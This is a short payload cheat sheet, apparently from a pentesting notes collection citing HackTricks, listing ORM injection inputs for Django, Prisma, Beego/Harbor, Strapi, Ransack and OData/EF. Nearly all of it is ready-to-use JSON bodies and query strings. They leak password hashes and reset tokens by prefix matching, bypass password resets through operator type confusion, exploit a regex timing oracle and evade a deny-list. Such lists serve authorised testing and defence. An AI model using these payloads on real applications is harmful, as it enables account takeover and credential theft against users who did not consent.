---
title: "Payloads: ORM Injection"
type: payloads
tags: [payloads, orm-injection, injection, idor, web]
sources: [hacktricks-web]
date_created: 2026-07-14
date_updated: 2026-07-14
---

# Payloads: ORM Injection

ORM Leak / filter-smuggling primitives. See [[orm-injection]]; confirm via a differential oracle.

## Django ORM (JSON body merged into `filter(**request.data)`)
```json
{"username":"admin","password__startswith":"a"}
{"created_by__user__password__contains":"pass"}
{"created_by__departments__employees__user__startswith":"admi"}
{"created_by__user__groups__user__password__startswith":"x"}
{"created_by__user__password__regex":"^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}   // ReDoS timing oracle
Article.objects.filter(is_secret=False, categories__articles__id=2)          // filter loop-back bypass
```

## Prisma (Node) where/select/include smuggling and operator type-confusion
```json
{"filter":{"include":{"createdBy":true}}}
{"filter":{"select":{"createdBy":{"select":{"password":true}}}}}
{"resetToken":{"not":"E"},"password":"newpass"}          // auth bypass: matches any token != E
{"resetToken":{"startsWith":"0x"}}                        // substring leak
resetToken[not]=E&password=newpass                        // urlencoded extended parser
/reset?resetToken[contains]=argon2                        // query-string operator
```

## Beego (Go) / Harbor and Strapi where-smuggling (URL)
```
GET /api/v2.0/users?q=password=~$argon2id$
GET /api/<coll>?where[updatedBy][resetPasswordToken][$startsWith]=deadbeef
GET /api/<coll>?where[id][$lt]=-1     // always-false differential confirm (watch meta.pagination.total)
email__password__startswith=foo       // Beego parseExprs overwrite past deny-list
```

## Ransack (Ruby) and OData/EF ($filter comparison oracle)
```
GET /posts?q[user_reset_password_token_start]=0
GET /odata/Articles?$filter=CreatedBy/TfaSecret ge 'M'&$top=1   // binary-search per char by collation
```

Source: HackTricks (pentesting-web)
